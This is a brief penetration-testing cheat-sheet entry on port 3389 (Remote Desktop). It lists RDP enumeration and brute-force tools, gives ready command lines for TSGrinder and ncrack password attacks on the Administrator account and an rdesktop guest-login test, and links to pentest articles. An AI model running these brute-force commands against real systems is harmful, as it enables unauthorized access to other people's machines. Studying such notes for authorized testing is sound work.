### Port 3389 - Remote desktop

Rdesktop Enumeration

    Remote Desktop Connection

Rdestop Bruteforce

    TSGrinder
        tsgrinder.exe -w dictionary_file -l leet -d workgroup -u administrator -b -n 2 IP_Address
    Tscrack 

Test logging in to see what OS is running

```
rdesktop -u guest -p guest INSERTIPADDRESS -g 94%

# Brute force
ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://INSERTIPADDRESS
```

https://www.hackingarticles.in/penetration-testing-remote-desktop-port-3389/

https://pentestlab.blog/tag/rdp/

https://www.hackingloops.com/penetration-testing-windows-7-machine-for-remote-desktop-vulnerability/


    https://serverfault.com/questions/148731/enabling-remote-desktop-with-command-prompt
    https://serverfault.com/questions/200417/ideal-settings-for-rdesktop
